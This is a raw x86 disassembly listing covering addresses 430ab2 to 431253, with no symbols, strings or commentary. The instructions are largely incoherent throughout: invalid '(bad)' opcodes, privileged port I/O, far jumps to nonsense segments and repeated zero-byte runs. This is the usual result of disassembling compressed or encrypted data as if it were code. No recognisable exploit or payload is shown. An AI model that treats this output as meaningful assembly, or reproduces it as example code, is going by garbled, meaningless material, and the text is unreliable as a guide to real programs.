  430ab2:	fnstsw WORD PTR [esi+0x14]
  430ab5:	mov    ebx,0xe807c4ec
  430aba:	xlat   BYTE PTR ds:[ebx]
  430abb:	push   esi
  430abc:	fsubr  st(6),st
  430abe:	nop
  430abf:	xor    DWORD PTR [edx-0x40],eax
  430ac2:	imul   edi,DWORD PTR [ecx+0x1e],0x12
  430ac6:	pop    esi
  430ac7:	lahf   
  430ac8:	xlat   BYTE PTR ds:[ebx]
  430ac9:	fmul   QWORD PTR [edx+0xb7a50b7]
  430acf:	and    eax,0x10b31551
  430ad4:	cli    
  430ad5:	call   DWORD PTR [eax+0x2ae73bef]
  430adb:	mov    ecx,DWORD PTR [edx-0x6]
  430ade:	ins    DWORD PTR es:[edi],dx
  430adf:	mov    ecx,0x533ad3
  430ae4:	add    BYTE PTR [eax],al
  430ae6:	add    BYTE PTR [eax],al
  430ae8:	je     0x430b67
  430aea:	jl     0x430ac9
  430aec:	and    DWORD PTR [eax-0x19],ebp
  430aef:	add    bh,BYTE PTR [eax-0x7ed373b4]
  430af5:	mov    dl,0xfa
  430af7:	aaa    
  430af8:	popf   
  430af9:	pop    edx
  430afa:	ins    DWORD PTR es:[edi],dx
  430afb:	dec    ecx
  430afc:	mov    ds:0x1da9844c,eax
  430b01:	mov    cl,0x7e
  430b03:	and    al,0x81
  430b05:	add    dh,BYTE PTR [edx+0x3c]
  430b08:	pop    ds
  430b09:	add    edx,DWORD PTR [eax+0x62]
  430b0c:	cmp    cl,BYTE PTR [eax]
  430b0e:	jmp    0x87f9:0x67e0
  430b14:	mov    al,0x4c
  430b16:	xchg   BYTE PTR [edi],ah
  430b18:	or     eax,0x2efdbf87
  430b1d:	out    0xff,al
  430b1f:	ins    DWORD PTR es:[edi],dx
  430b20:	and    eax,DWORD PTR [eax]
  430b22:	in     ax,dx
  430b24:	pop    ebp
  430b25:	or     al,BYTE PTR [eax+0x734feedf]
  430b2b:	adc    BYTE PTR [ebx+0x1],cl
  430b2e:	add    ebp,edx
  430b30:	cmp    BYTE PTR [ebp+0x7c],0x7d
  430b34:	fs inc edx
  430b36:	out    0x5e,eax
  430b38:	pushf  
  430b39:	dec    ebx
  430b3a:	cli    
  430b3b:	ss stos DWORD PTR es:[edi],eax
  430b3d:	sti    
  430b3e:	xchg   BYTE PTR [esi],ah
  430b40:	sbb    cl,dl
  430b42:	pop    es
  430b43:	mov    ecx,0x934f4051
  430b48:	jle    0x430af4
  430b4a:	xchg   BYTE PTR [esi],ah
  430b4c:	add    BYTE PTR [eax],al
  430b4e:	add    BYTE PTR [eax],al
  430b50:	add    BYTE PTR [ecx],dl
  430b52:	mov    dh,0x6a
  430b54:	(bad)  
  430b57:	mov    edi,0x81531000
  430b5c:	inc    esi
  430b5d:	cwde   
  430b5e:	pop    ecx
  430b5f:	cli    
  430b60:	inc    BYTE PTR [edx]
  430b62:	sti    
  430b63:	popa   
  430b64:	add    edx,esp
  430b66:	(bad)  [ebp+0x55ae5bfe]
  430b6c:	pop    ebx
  430b6d:	and    eax,0xa2fffec1
  430b72:	xchg   ebp,eax
  430b73:	cmp    ecx,0xc76a36d7
  430b79:	arpl   WORD PTR [ebx],si
  430b7b:	mov    BYTE PTR [eax+0x5c],al
  430b7e:	mov    al,dh
  430b80:	je     0x430bd3
  430b82:	fcmovne st,st(5)
  430b84:	mov    dh,0xa
  430b86:	scas   al,BYTE PTR es:[edi]
  430b87:	xor    edi,0xffa2f804
  430b8d:	or     esi,DWORD PTR [ebp+0x418243e]
  430b93:	je     0x430b9b
  430b95:	arpl   si,bx
  430b97:	sub    esp,DWORD PTR [ebp-0x387e5205]
  430b9d:	imul   edx,DWORD PTR [eax-0x67f3fb44],0xffffff81
  430ba4:	in     al,dx
  430ba5:	pop    ebp
  430ba6:	xchg   ecx,eax
  430ba7:	push   eax
  430ba8:	push   edi
  430ba9:	pop    ebx
  430baa:	cmp    BYTE PTR [esi],dl
  430bac:	xor    esi,DWORD PTR [edi]
  430bae:	scas   al,BYTE PTR es:[edi]
  430baf:	jae    0x430bc9
  430bb1:	push   edi
  430bb2:	stos   DWORD PTR es:[edi],eax
  430bb3:	cmc    
  430bb4:	jne    0x430bb6
  430bb6:	add    BYTE PTR [eax],al
  430bb8:	add    BYTE PTR [eax],al
  430bba:	loopne 0x430b69
  430bbc:	jae    0x430bce
  430bbe:	cmp    edi,DWORD PTR [eax]
  430bc0:	push   es
  430bc1:	inc    DWORD PTR [ecx]
  430bc3:	sti    
  430bc4:	dec    edx
  430bc5:	push   ebx
  430bc6:	xor    al,0xbd
  430bc8:	cli    
  430bc9:	dec    esp
  430bcb:	jns    0x430bb7
  430bcd:	cmp    ecx,DWORD PTR [edi-0x6a998ac9]
  430bd3:	lea    ebx,[edx]
  430bd5:	je     0x430c4c
  430bd7:	sub    eax,ebp
  430bd9:	psubsb mm4,QWORD PTR [esi+0x8254ec2]
  430be0:	repnz dec edi
  430be2:	arpl   WORD PTR [ecx+0x64b97efe],bx
  430be8:	call   0x85ca2eea
  430bed:	inc    ecx
  430bee:	mov    ecx,0x94429054
  430bf3:	lds    ecx,FWORD PTR [edx+0x44bd954a]
  430bf9:	loopne 0x430c68
  430bfb:	lds    ecx,FWORD PTR [edx]
  430bfd:	rcr    ebx,0xd2
  430c00:	mov    ebp,0xf824fe41
  430c05:	mov    BYTE PTR [ebx-0x65c721dd],bh
  430c0b:	push   edi
  430c0c:	retf   0x9f3e
  430c0f:	pop    es
  430c10:	mov    DWORD PTR [ecx-0x3f],eax
  430c13:	or     BYTE PTR [edx+edi*8+0x3fee0b88],dh
  430c1a:	jne    0x430bf4
  430c1c:	aas    
  430c1d:	or     eax,DWORD PTR [eax]
  430c1f:	add    BYTE PTR [eax],al
  430c21:	add    BYTE PTR [eax],al
  430c23:	lahf   
  430c24:	sub    al,0xb6
  430c26:	popa   
  430c27:	cld    
  430c28:	and    eax,0x1ccb0ab0
  430c2d:	adc    DWORD PTR [edx-0x12],esp
  430c30:	in     al,dx
  430c31:	punpckldq mm6,DWORD PTR [edx+edi*4+0x1a7e620b]
  430c39:	jmp    0xf651:0xbde25b0f
  430c40:	and    al,0x20
  430c42:	lea    edi,[ebx]
  430c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430c45:	lods   eax,DWORD PTR ds:[esi]
  430c46:	dec    edi
  430c47:	cld    
  430c48:	ins    DWORD PTR es:[edi],dx
  430c49:	mov    dh,0xfa
  430c4b:	push   0x753ff0a7
  430c50:	fdivr  DWORD PTR [edi]
  430c52:	or     edi,esp
  430c54:	add    al,bl
  430c56:	out    0x4f,eax
  430c58:	jns    0x430c7c
  430c5a:	mov    edx,0x45b3ab4b
  430c5f:	add    BYTE PTR [edx],0xb4
  430c62:	mov    ds,WORD PTR [esi-0x39f5684d]
  430c68:	add    esi,DWORD PTR [esi-0x19b5fccb]
  430c6e:	shl    BYTE PTR [edx+0x7b],1
  430c71:	fwait
  430c72:	pop    ebx
  430c73:	std    
  430c74:	mov    dh,0xe4
  430c76:	outs   dx,BYTE PTR ds:[esi]
  430c77:	jae    0x430bfa
  430c79:	loopne 0x430c6d
  430c7b:	jmp    0x62f36c84
  430c80:	jnp    0x430c9d
  430c82:	pop    eax
  430c83:	ror    BYTE PTR [ebp+0x3b],0xf0
  430c87:	add    BYTE PTR [eax],al
  430c89:	add    BYTE PTR [eax],al
  430c8b:	add    BYTE PTR [edi-0x29],cl
  430c8e:	fdiv   DWORD PTR [ebp+0x5ae4d73f]
  430c94:	sar    edx,0xa9
  430c97:	shr    BYTE PTR [esi],1
  430c99:	dec    ebp
  430c9a:	sbb    ebx,DWORD PTR [edx+edx*1+0x6]
  430c9e:	jmp    0xa67e81a6
  430ca3:	repz sbb dh,BYTE PTR [esi+0x5df5675d]
  430caa:	hlt    
  430cab:	add    al,0x75
  430cad:	add    dl,BYTE PTR [esi]
  430caf:	lahf   
  430cb0:	xchg   esi,eax
  430cb1:	pop    es
  430cb2:	jmp    0xaff8b3ba
  430cb7:	mov    eax,0xede2d592
  430cbc:	pop    dx
  430cbe:	push   ecx
  430cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430cc0:	fisttp WORD PTR [ebp+ebx*2+0x53]
  430cc4:	mov    ecx,DWORD PTR [ebp+0xd]
  430cc7:	push   ebx
  430cc8:	inc    esi
  430cc9:	call   0x4d60a91e
  430cce:	cmp    DWORD PTR [esi],edx
  430cd0:	mov    ch,0x7a
  430cd2:	push   DWORD PTR [esi-0x46fec05a]
  430cd8:	cld    
  430cd9:	or     al,0x0
  430cdb:	(bad)  
  430cdc:	stc    
  430cdd:	ret    0x8743
  430ce0:	icebp  
  430ce1:	ret    0x6253
  430ce4:	cmp    al,0x86
  430ce6:	cli    
  430ce7:	xchg   ebp,eax
  430ce8:	leave  
  430ce9:	int3   
  430cea:	jl     0x430cb9
  430cec:	jbe    0x430cc4
  430cee:	push   ebx
  430cef:	xchg   ecx,eax
  430cf0:	add    BYTE PTR [eax],al
  430cf2:	add    BYTE PTR [eax],al
  430cf4:	add    BYTE PTR [esi],ch
  430cf6:	dec    ebp
  430cf7:	cli    
  430cf8:	jmp    0xeee14f0b
  430cfd:	int3   
  430cfe:	test   bh,ch
  430d00:	ins    BYTE PTR es:[edi],dx
  430d01:	(bad)  
  430d02:	iret   
  430d03:	push   cs
  430d04:	shl    edx,1
  430d06:	call   0xe7c2:0x4280d6fa
  430d0d:	pop    edx
  430d0e:	jp     0x430d4f
  430d10:	jmp    0x31848869
  430d15:	ror    BYTE PTR [ebp+0x2d],1
  430d18:	mov    edi,0x646fd0ee
  430d1d:	(bad)  
  430d1e:	iret   
  430d1f:	adc    dh,BYTE PTR [edx-0x3c]
  430d22:	arpl   cx,dx
  430d24:	push   eax
  430d25:	mov    esp,0x45a98348
  430d2a:	clc    
  430d2b:	xchg   BYTE PTR [esi],dl
  430d2d:	sub    DWORD PTR [ebp+eax*8+0x50],esp
  430d31:	lods   al,BYTE PTR ds:[esi]
  430d32:	dec    eax
  430d33:	sub    DWORD PTR [ecx-0x11790cce],0x8
  430d3a:	add    eax,DWORD PTR [edi+0x2efb4c9e]
  430d40:	sub    DWORD PTR [edx+ebp*4],ebp
  430d43:	push   esi
  430d44:	xor    BYTE PTR [ebx],bh
  430d46:	jmp    0x430d47
  430d48:	popa   
  430d49:	mov    dl,0xeb
  430d4b:	mov    bh,0x39
  430d4d:	jbe    0x430d51
  430d4f:	add    BYTE PTR [eax],al
  430d51:	ja     0x430d11
  430d53:	outs   dx,BYTE PTR ds:[esi]
  430d54:	aaa    
  430d55:	ja     0x430d14
  430d57:	outs   dx,BYTE PTR ds:[esi]
  430d58:	xor    eax,DWORD PTR [eax]
  430d5a:	add    BYTE PTR [eax],al
  430d5c:	add    BYTE PTR [eax],al
  430d5e:	push   ecx
  430d5f:	iret   
  430d60:	ret    0x9c00
  430d63:	inc    DWORD PTR [esi]
  430d65:	mov    bh,0x8e
  430d67:	in     eax,dx
  430d68:	(bad)  
  430d69:	jge    0x430d10
  430d6b:	popa   
  430d6c:	xor    eax,esi
  430d6e:	inc    DWORD PTR [ebx+eax*4]
  430d71:	(bad)  
  430d72:	ja     0x430d6b
  430d74:	add    dh,0xfa
  430d77:	out    dx,al
  430d78:	jmp    0x4d2a:0xb97e8e72
  430d7f:	stc    
  430d80:	lods   eax,DWORD PTR ds:[esi]
  430d81:	shl    dh,0xff
  430d84:	out    0xb9,eax
  430d86:	xchg   DWORD PTR [ecx+0x26918bf5],ebp
  430d8c:	mov    BYTE PTR [ebp+0x68],al
  430d8f:	(bad)  
  430d91:	lds    ebx,FWORD PTR [ecx-0x35f0ffde]
  430d97:	mov    WORD PTR [esi],ds
  430d99:	dec    di
  430d9b:	shl    BYTE PTR [eax-0x7d],0xc
  430d9f:	and    ebx,DWORD PTR [esi-0x77]
  430da2:	pop    ebx
  430da3:	push   edx
  430da4:	add    eax,0xe28edcb7
  430da9:	sbb    BYTE PTR [edi+0x4b89f5aa],ch
  430daf:	push   esi
  430db0:	add    eax,0x68
  430db3:	ja     0x430e2e
  430db5:	jge    0x430dbb
  430db7:	inc    DWORD PTR [edx+0x3a50501d]
  430dbd:	add    al,bh
  430dbf:	clc    
  430dc0:	popa   
  430dc1:	adc    BYTE PTR [eax],al
  430dc3:	add    BYTE PTR [eax],al
  430dc5:	add    BYTE PTR [eax],al
  430dc7:	arpl   WORD PTR [edx+eax*1],di
  430dca:	lea    ebx,[ebx]
  430dcc:	mov    ecx,DWORD PTR [edx-0x1]
  430dcf:	lahf   
  430dd0:	xchg   BYTE PTR [esi-0x2e278af4],bh
  430dd6:	or     esi,DWORD PTR [ebp+0x35]
  430dd9:	or     BYTE PTR [esi+0x69],ah
  430ddc:	(bad)  
  430ddd:	leave  
  430dde:	or     esi,eax
  430de0:	mov    ds:0xe7ba4faa,eax
  430de5:	add    ebx,0xffffff81
  430de8:	sbb    al,0xca
  430dea:	adc    edi,edi
  430dec:	popf   
  430ded:	out    dx,al
  430dee:	cli    
  430def:	sub    BYTE PTR [ecx+0x22],cl
  430df2:	cs call 0xc953:0x3a8d1a6d
  430dfa:	pop    ss
  430dfb:	popf   
  430dfc:	cld    
  430dfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430dfe:	cli    
  430dff:	sbb    al,0xd1
  430e02:	pop    ss
  430e03:	jno    0x430dd0
  430e05:	cli    
  430e06:	cs xor eax,0x230afb05
  430e0c:	pop    ss
  430e0d:	cld    
  430e0e:	xchg   DWORD PTR [edx+0x4d046550],edi
  430e14:	mov    al,ds:0xe552faac
  430e19:	retf   0xdf0f
  430e1c:	out    dx,eax
  430e1d:	mov    BYTE PTR [edx+0x6b],al
  430e20:	jmp    0x430dcb
  430e22:	cli    
  430e23:	es xchg ecx,eax
  430e25:	rcr    BYTE PTR [edi],1
  430e27:	mul    BYTE PTR [ecx+0xfb27]
  430e2d:	add    BYTE PTR [eax],al
  430e2f:	add    BYTE PTR [eax+0x46faa9ff],ah
  430e35:	pop    ecx
  430e36:	mov    WORD PTR [ecx+edx*2+0x5c],es
  430e3a:	iret   
  430e3b:	pop    ds
  430e3c:	neg    BYTE PTR [edi-0x148b9a05]
  430e42:	test   eax,0x513451e7
  430e47:	cli    
  430e48:	push   0x8
  430e4a:	stos   DWORD PTR es:[edi],eax
  430e4b:	adc    edi,DWORD PTR [edx-0x1506a422]
  430e51:	add    ah,BYTE PTR [edx+0x0]
  430e54:	jne    0x430e58
  430e56:	jmp    0xe311b6db
  430e5b:	mov    al,BYTE PTR [edi-0xe]
  430e5e:	pop    ebx
  430e5f:	add    edx,0xda574148
  430e65:	sbb    esi,edi
  430e67:	push   ebp
  430e68:	mov    edi,0xd36d297d
  430e6d:	dec    eax
  430e6e:	sub    DWORD PTR [edi+0x41],edx
  430e71:	jge    0x430e87
  430e73:	mov    bl,0x44
  430e75:	adc    eax,0x8212b33e
  430e7a:	call   0xe71f8382
  430e7f:	mov    dl,0x10
  430e81:	add    edx,DWORD PTR [ecx-0x56fd8afd]
  430e87:	push   esi
  430e88:	add    edx,edi
  430e8a:	icebp  
  430e8b:	lock mov dl,0xf4
  430e8e:	test   al,0x3
  430e90:	repnz push ecx
  430e92:	gs push ebp
  430e94:	add    BYTE PTR [eax],al
  430e96:	add    BYTE PTR [eax],al
  430e98:	add    BYTE PTR [edi-0x32],bl
  430e9b:	adc    bl,BYTE PTR ds:0xfb5cf6b8
  430ea1:	lea    esp,[edi-0x4a9b3008]
  430ea7:	jae    0x430e69
  430ea9:	jb     0x430e5d
  430eab:	mov    ecx,0x3b496ad0
  430eb0:	or     bh,al
  430eb2:	dec    ecx
  430eb3:	rol    edi,cl
  430eb5:	js     0x430e79
  430eb7:	call   0xe710f13c
  430ebc:	xchg   edx,eax
  430ebd:	jne    0x430e6f
  430ebf:	xchg   ecx,eax
  430ec0:	lock jbe 0x430eb8
  430ec3:	sub    BYTE PTR [esi*8+0x7acfe74c],al
  430eca:	dec    ecx
  430ecb:	repz or ecx,DWORD PTR ds:0x4b2eff71
  430ed2:	dec    esp
  430ed3:	pop    ecx
  430ed4:	arpl   WORD PTR [edi],si
  430ed6:	mov    al,0x5c
  430ed8:	sub    edi,DWORD PTR [edx+0x2]
  430edb:	push   ebp
  430edc:	jb     0x430f30
  430ede:	mov    dl,0x50
  430ee0:	mov    esi,0xb6524d67
  430ee5:	fadd   QWORD PTR [edi+0x51]
  430ee8:	sar    DWORD PTR [ecx-0x26],cl
  430eeb:	(bad)  
  430eec:	call   0xbd3d9167
  430ef1:	jle    0x430f40
  430ef3:	adc    al,0xa9
  430ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430ef6:	or     BYTE PTR [eax],al
  430ef8:	jo     0x430eda
  430efa:	add    BYTE PTR [edi+0x21],bh
  430efd:	add    BYTE PTR [eax],al
  430eff:	add    BYTE PTR [eax],al
  430f01:	add    BYTE PTR [ebx-0x2b],al
  430f04:	outs   dx,DWORD PTR ds:[esi]
  430f05:	fs mov ebp,0x23b95050
  430f0b:	out    dx,al
  430f0c:	aaa    
  430f0d:	(bad)  [esi-0x55d67cb8]
  430f13:	mov    al,0x38
  430f15:	je     0x430ee1
  430f17:	into   
  430f18:	dec    esi
  430f19:	bound  esi,QWORD PTR ds:0x752f8850
  430f1f:	movnti DWORD PTR [ebp+esi*2+0x79],edx
  430f24:	cmp    edx,eax
  430f26:	fs loopne 0x430f2c
  430f29:	inc    ecx
  430f2a:	jno    0x430f3e
  430f2c:	add    cl,ch
  430f2e:	push   es
  430f2f:	mov    ch,0xfa
  430f31:	aam    0x8a
  430f33:	repnz aas 
  430f35:	jmp    0xa67a1139
  430f3a:	inc    ebp
  430f3b:	sbb    BYTE PTR [ebx+0x74],dl
  430f3e:	cmp    al,BYTE PTR [eax]
  430f40:	push   ecx
  430f41:	sahf   
  430f42:	sub    eax,DWORD PTR [eax+edx*2]
  430f45:	xchg   esi,eax
  430f46:	inc    ebx
  430f47:	add    bl,bh
  430f49:	hlt    
  430f4a:	retf   0x3ff5
  430f4d:	add    BYTE PTR [ecx+ecx*8],cl
  430f50:	mov    edx,0x437b0874
  430f55:	or     BYTE PTR [edi],ah
  430f57:	xchg   dh,bh
  430f59:	je     0x430f2b
  430f5b:	jae    0x430f5c
  430f5d:	jmp    0x3cc:0x7ffa5675
  430f64:	dec    edi
  430f65:	inc    DWORD PTR [eax]
  430f67:	add    BYTE PTR [eax],al
  430f69:	add    BYTE PTR [eax],al
  430f6b:	jb     0x430f1a
  430f6d:	adc    edx,eax
  430f6f:	int    0x43
  430f71:	cli    
  430f72:	inc    BYTE PTR [edx]
  430f74:	cld    
  430f75:	not    BYTE PTR ds:0x3a52d0
  430f7b:	scas   al,BYTE PTR es:[edi]
  430f7c:	ret    
  430f7d:	push   ebp
  430f7e:	leave  
  430f7f:	pop    esi
  430f80:	add    al,BYTE PTR [eax]
  430f82:	push   esi
  430f83:	daa    
  430f84:	scas   al,BYTE PTR es:[edi]
  430f85:	add    DWORD PTR [esi],0xe6ebe11
  430f8b:	hlt    
  430f8c:	add    eax,DWORD PTR [eax-0x5a66400]
  430f92:	dec    edi
  430f93:	jnp    0x430fec
  430f95:	retf   0xcc11
  430f98:	add    eax,DWORD PTR [ebx-0xf37ab8a]
  430f9e:	je     0x430ff3
  430fa0:	xchg   ebp,eax
  430fa1:	cmc    
  430fa2:	adc    eax,0x3a5250
  430fa7:	call   0xe684:0x388b53c1
  430fae:	adc    BYTE PTR [eax+0x3],dl
  430fb1:	add    BYTE PTR [ebx+0x62],dl
  430fb4:	xchg   ebp,eax
  430fb5:	mov    eax,DWORD PTR [ebp-0xa5604]
  430fbb:	mov    WORD PTR [esi-0x10],ss
  430fbe:	add    BYTE PTR [ebx+eax*1],bl
  430fc1:	not    DWORD PTR ds:0x3a5230
  430fc7:	fs out dx,eax
  430fc9:	hlt    
  430fca:	add    BYTE PTR [ebp+0x59],dh
  430fcd:	(bad)  
  430fce:	jb     0x430fd0
  430fd0:	add    BYTE PTR [eax],al
  430fd2:	add    BYTE PTR [eax],al
  430fd4:	cdq    
  430fd5:	sub    al,0x4c
  430fd7:	cli    
  430fd8:	mov    BYTE PTR [ecx+0x66],dl
  430fdb:	daa    
  430fdc:	dec    esp
  430fdd:	enter  0x4f53,0x5d
  430fe1:	std    
  430fe2:	iret   
  430fe3:	aas    
  430fe4:	jne    0x430fe7
  430fe6:	ror    BYTE PTR [ecx+0x3975935],1
  430fec:	je     0x431047
  430fee:	dec    BYTE PTR [eax+edx*1-0x3505ae4f]
  430ff5:	rol    cl,0x8f
  430ff8:	ret    0x7fbf
  430ffb:	ret    
  430ffc:	fcom   QWORD PTR gs:[esi-0x6]
  431000:	sub    DWORD PTR [eax-0x79],edx
  431003:	ret    0xa645
  431006:	jns    0x430ff7
  431008:	sahf   
  431009:	pop    ds
  43100a:	push   esp
  43100b:	dec    edi
  43100c:	call   0x54fa:0xcae8026d
  431013:	cli    
  431014:	lock sbb bl,cl
  431017:	pop    ds
  431018:	mulps  xmm4,xmm6
  43101b:	jg     0x431092
  43101d:	pop    ecx
  43101e:	(bad)  
  43101f:	gs je  0x430fa3
  431022:	(bad)  
  431023:	gs je  0x430fa9
  431026:	(bad)  
  431027:	push   DWORD PTR [ebp-0x65]
  43102a:	dec    esi
  43102b:	je     0x431096
  43102d:	and    al,0xf8
  43102f:	aas    
  431030:	sbb    eax,DWORD PTR [si]
  431033:	jg     0x431082
  431035:	xor    eax,0xdd8
  43103a:	add    BYTE PTR [eax],al
  43103c:	add    BYTE PTR [ebx+0x75c74dda],bh
  431042:	pop    ebx
  431043:	(bad)  
  431044:	ins    DWORD PTR es:[edi],dx
  431045:	or     ecx,DWORD PTR [edx+0x3e]
  431048:	pop    edx
  431049:	retf   
  43104a:	lock cmp al,0xbd
  43104d:	ins    DWORD PTR es:[edi],dx
  43104e:	add    ch,cl
  431050:	mov    bl,0x1f
  431052:	lock in al,0xf6
  431055:	push   edx
  431056:	add    bl,BYTE PTR [ecx+0x5]
  431059:	adc    dl,BYTE PTR [ebp+0x33]
  43105c:	jg     0x43106c
  43105e:	test   BYTE PTR [esp+esi*8-0x4916fd8a],dl
  431065:	inc    esp
  431066:	lods   eax,DWORD PTR ds:[esi]
  431067:	arpl   WORD PTR [ecx+0x536949da],cx
  43106d:	xor    bl,dl
  43106f:	pop    edx
  431070:	add    al,0x75
  431072:	add    bl,BYTE PTR [edx-0x7]
  431075:	xchg   esi,eax
  431076:	icebp  
  431077:	test   al,0x3
  431079:	cmp    eax,0x75045407
  43107e:	add    bh,BYTE PTR [edx+0x504c8bb8]
  431084:	mov    DWORD PTR [edx+0x45],ebx
  431087:	xor    DWORD PTR [edx+edx*1-0x5d3c4b2a],esi
  43108e:	fnsave [eax-0x7e]
  431091:	pop    edx
  431092:	add    bl,BYTE PTR [esi+0x8]
  431095:	je     0x431099
  431097:	jmp    0xb8dda1c
  43109c:	push   ebx
  43109d:	jg     0x4310f9
  43109f:	dec    esi
  4310a0:	add    DWORD PTR [eax],0x0
  4310a3:	add    BYTE PTR [eax],al
  4310a5:	add    BYTE PTR [edi+0x45],bh
  4310a8:	gs dec eax
  4310aa:	jle    0x43102d
  4310ac:	lock push edx
  4310ae:	out    0x19,al
  4310b0:	pop    esi
  4310b1:	dec    ebx
  4310b2:	mov    dl,0x77
  4310b4:	imul   edx,DWORD PTR [ebx+0x63],0x45
  4310b8:	fnstenv [ebx+0x5be0cf4f]
  4310be:	pushaw 
  4310c0:	retf   0xf952
  4310c3:	inc    ecx
  4310c4:	cmp    al,0x3
  4310c6:	rol    DWORD PTR [edx],cl
  4310c8:	mov    edx,0xff457ad8
  4310cd:	fild   DWORD PTR [edx]
  4310cf:	idiv   DWORD PTR [edi]
  4310d1:	jmp    0xf6b795c3
  4310d6:	sub    al,0xc4
  4310d8:	stc    
  4310d9:	add    eax,0xa92d962b
  4310de:	(bad)  
  4310df:	stos   BYTE PTR es:[edi],al
  4310e0:	push   esi
  4310e1:	mov    al,ds:0x390001b8
  4310e6:	jno    0x431145
  4310e8:	hlt    
  4310e9:	fs rcr DWORD PTR ss:[edx],1
  4310ed:	pslld  mm1,QWORD PTR [edx+ebp*1]
  4310f1:	hlt    
  4310f2:	shl    edi,1
  4310f4:	mov    dl,0xb1
  4310f6:	jo     0x4310d8
  4310f8:	test   BYTE PTR [eax],dh
  4310fa:	stos   BYTE PTR es:[edi],al
  4310fb:	clc    
  4310fc:	jle    0x43114e
  4310fe:	xchg   esp,eax
  4310ff:	iret   
  431100:	push   es
  431101:	(bad)  
  431102:	sti    
  431103:	int3   
  431104:	add    ebp,ecx
  431106:	popf   
  431107:	add    BYTE PTR [edi],ch
  431109:	sub    DWORD PTR [eax],eax
  43110b:	add    BYTE PTR [eax],al
  43110d:	add    BYTE PTR [eax],al
  43110f:	mov    dh,0x83
  431111:	sub    DWORD PTR cs:[ebx],esi
  431114:	mov    ah,0x54
  431116:	(bad)  
  431118:	and    BYTE PTR [edi+edi*4],cl
  43111b:	fild   QWORD PTR [ebp-0x11d8bdd3]
  431121:	arpl   dx,di
  431123:	mov    dh,0x44
  431125:	test   DWORD PTR [ecx],ebx
  431127:	in     eax,dx
  431128:	push   edx
  431129:	je     0x431116
  43112b:	sti    
  43112c:	dec    ebp
  43112d:	or     dh,BYTE PTR [esi]
  43112f:	jl     0x4310f4
  431131:	not    DWORD PTR [ebp-0xe8101be]
  431137:	xchg   esp,eax
  431138:	into   
  431139:	add    al,0x4f
  43113b:	repnz xor DWORD PTR [ebp+ecx*1-0x30],0x4b
  431141:	cs test eax,0xe788e202
  431147:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431148:	out    dx,al
  431149:	inc    edi
  43114a:	add    BYTE PTR [esi],bl
  43114c:	inc    eax
  43114d:	cli    
  43114e:	xor    BYTE PTR [edx+esi*4],0x73
  431152:	or     eax,0xff54feb6
  431157:	dec    ecx
  431158:	ins    BYTE PTR es:[edi],dx
  431159:	or     al,0x40
  43115b:	or     al,0x7d
  43115d:	mov    edx,0xa681eeb
  431162:	je     0x431177
  431164:	pop    edx
  431165:	cmp    edi,0x68
  431168:	inc    esi
  431169:	pusha  
  43116a:	mov    DWORD PTR [edx],esi
  43116c:	jg     0x43112e
  43116e:	add    al,BYTE PTR [edi]
  431170:	je     0x43111b
  431172:	add    DWORD PTR [eax],eax
  431174:	add    BYTE PTR [eax],al
  431176:	add    BYTE PTR [eax],al
  431178:	adc    DWORD PTR [eax-0x69f075a5],0xffffffbc
  43117f:	add    al,0xcc
  431181:	mov    WORD PTR [ecx-0xd25a014],es
  431187:	xor    DWORD PTR [eax],0xccfffe96
  43118d:	mov    DWORD PTR [ebp+0x68],ecx
  431190:	adc    BYTE PTR [ecx],bh
  431192:	cmp    al,BYTE PTR [eax]
  431194:	daa    
  431195:	mov    bh,0x4d
  431197:	(bad)  
  431198:	fcomp  DWORD PTR [ebx]
  43119a:	adc    BYTE PTR [eax+0x34],dl
  43119d:	aas    
  43119e:	(bad)  
  4311a0:	push   ebx
  4311a1:	jnp    0x43115d
  4311a3:	je     0x43117b
  4311a5:	les    edi,FWORD PTR [esi+0x24]
  4311a8:	mov    ebp,?
  4311aa:	(bad)  
  4311ab:	(bad)  
  4311ac:	mov    esp,0x80243ec4
  4311b1:	(bad)  
  4311b2:	cmc    
  4311b3:	adc    eax,0x3a4d4c
  4311b8:	xlat   BYTE PTR ds:[ebx]
  4311b9:	scas   al,BYTE PTR es:[edi]
  4311ba:	jns    0x4311ba
  4311bc:	push   ebx
  4311bd:	sub    ebx,DWORD PTR [edx-0x73]
  4311c0:	enter  0x3c1b,0x2
  4311c4:	pop    esp
  4311c5:	jmp    edi
  4311c7:	sub    DWORD PTR [ebp+0x2c],esi
  4311ca:	dec    edi
  4311cb:	cli    
  4311cc:	stc    
  4311cd:	cwde   
  4311ce:	shl    DWORD PTR [ecx],1
  4311d0:	call   0x777f34a9
  4311d5:	pop    ecx
  4311d6:	dec    BYTE PTR [edi-0x3e]
  4311d9:	faddp  st(2),st
  4311db:	and    eax,DWORD PTR [eax]
  4311dd:	add    BYTE PTR [eax],al
  4311df:	add    BYTE PTR [eax],al
  4311e1:	test   ecx,ebp
  4311e3:	pop    ebx
  4311e4:	call   DWORD PTR ds:0x35844f9b
  4311ea:	in     eax,dx
  4311eb:	lock icebp 
  4311ed:	icebp  
  4311ee:	xor    al,0xee
  4311f0:	std    
  4311f1:	add    bl,BYTE PTR [ecx-0x12]
  4311f4:	jae    0x431264
  4311f6:	into   
  4311f7:	mov    edx,0x76717d23
  4311fc:	cli    
  4311fd:	jmp    0x281c:0xf0055bcb
  431204:	or     BYTE PTR [ebp-0x4f],al
  431207:	jns    0x431247
  431209:	shl    DWORD PTR [ebx+0x49918379],cl
  43120f:	add    al,0x0
  431211:	jne    0x43119c
  431213:	mov    eax,0xf45560fa
  431218:	aas    
  431219:	jne    0x4311f9
  43121b:	ds je  0x4311f0
  43121e:	bound  ecx,QWORD PTR [edi+0x14]
  431221:	jno    0x43124a
  431223:	mov    esi,0xfed912ff
  431228:	push   DWORD PTR [ebp-0x74]
  43122b:	dec    edi
  43122c:	adc    al,0x51
  43122e:	inc    edi
  43122f:	mov    esi,0xf1f42bff
  431234:	xlat   BYTE PTR ds:[ebx]
  431235:	fs cdq 
  431237:	inc    BYTE PTR [ebp+esi*1+0x3594ffa1]
  43123e:	call   0x427b:0xecc0e47b
  431245:	add    BYTE PTR [eax],al
  431247:	add    BYTE PTR [eax],al
  431249:	add    BYTE PTR [ecx-0x449c9fe],bl
  43124f:	mov    dh,0x20
  431251:	int3   
  431252:	dec    ebx
  431253:	cmp    DWORD PTR ds:0xf0e07d2b,edx
